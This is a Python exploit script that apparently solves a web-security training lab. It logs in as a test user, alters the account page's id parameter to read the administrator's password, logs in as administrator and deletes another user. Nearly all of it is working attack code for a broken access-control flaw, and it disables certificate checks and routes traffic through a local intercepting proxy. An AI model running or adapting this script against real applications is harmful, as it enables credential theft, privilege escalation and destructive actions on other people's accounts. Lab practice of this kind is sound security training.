import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def get_csrf_token(url,s):
    req = s.get(url,proxies=proxies,verify=False)
    soup = BeautifulSoup(req.text,'lxml')
    csrf = soup.find('input',{'name':'csrf'})['value']
    return csrf

def get_admin_password(url,s):
    ##^ first login with wiener to get admin password
    loginUrl = url + '/login'
    csrf = get_csrf_token(loginUrl,s)
    data = {
        'csrf':csrf,
        'username': 'wiener',
        'password': 'peter'
    }
    print("(+) Trying to login with wiener")
    req = s.post(loginUrl,data=data,proxies=proxies,verify=False)
    res = req.text
    if "Log out" in res:
        print("(+) Successfully logged in")
        print("(+) Trying log in as admin...")
        adminUrl = url + '/my-account?id=administrator'
        req = s.get(adminUrl,proxies=proxies,verify=False)
        res = req.text
        if "administrator" in res:
            print("(+) Successfully changed parameter to administrator")
            print("(+) Trying to extract admin password...")
            soup = BeautifulSoup(req.text, 'lxml')
            password = soup.find('input', {'name': 'password'})['value']
            ##! print(password)
            delete_usr(url,s,password)
            ##* now we have admin password to login with it
        else:
            print("(+) Can't change parameter to admin")
    else:
        print("(+) Can't Log in to wiener")

##&==============================================================================
        
def delete_usr(url,s,password):
    log_out_url = url + '/logout'
    req = s.get(log_out_url,proxies = proxies , verify = False)
    print("(+) Logging out from wiener...")
    login_url = url + '/login'
    csrf = get_csrf_token(login_url,s)
    data={
        'csrf' : csrf,
        'username' : 'administrator',
        'password' : password,
    }
    req = s.post(login_url,data=data,proxies = proxies , verify = False)
    res = req.text
    if "administrator" in res:
        print("(+) Successfully logged in with admin")
        print("(+) Trying to delete carlos user")
        delete_url= url + '/admin/delete?username=carlos'
        req = s.get(delete_url,proxies=proxies,verify=False)
        print("(+) Successfully deleted carlos user!")
        print("(+) Lab Solved !")
    else:
        print("(+) Can't login as admin")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0].split('/')[-1]} URL")
        print(f"Example: {sys.argv[0].split('/')[-1]} www.example.com")
        sys.exit(-1)
    
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    s = requests.Session()
    get_admin_password(url, s)



if __name__ == '__main__':
    main()